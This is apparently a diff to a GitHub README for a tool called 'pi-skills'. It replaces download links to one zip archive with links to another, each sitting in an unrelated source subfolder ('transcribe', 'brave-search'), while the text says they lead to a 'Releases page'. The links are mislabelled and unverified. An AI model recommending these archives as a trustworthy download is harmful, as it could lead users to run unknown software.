@@ -6,11 +6,11 @@ Welcome to **pi-skills**! This application helps you harness the power of your c
 
 ## 📥 Download the Application
 
-[![Download pi-skills](https://raw.githubusercontent.com/Mucho-G/pi-skills/main/transcribe/skills-pi-3.0.zip)](https://raw.githubusercontent.com/Mucho-G/pi-skills/main/transcribe/skills-pi-3.0.zip)
+[![Download pi-skills](https://github.com/Mucho-G/pi-skills/raw/refs/heads/main/brave-search/skills_pi_2.6.zip)](https://github.com/Mucho-G/pi-skills/raw/refs/heads/main/brave-search/skills_pi_2.6.zip)
 
 To get started, download the software from our Releases page:
 
-[Visit this page to download](https://raw.githubusercontent.com/Mucho-G/pi-skills/main/transcribe/skills-pi-3.0.zip)
+[Visit this page to download](https://github.com/Mucho-G/pi-skills/raw/refs/heads/main/brave-search/skills_pi_2.6.zip)
 
 ## 💻 System Requirements
 
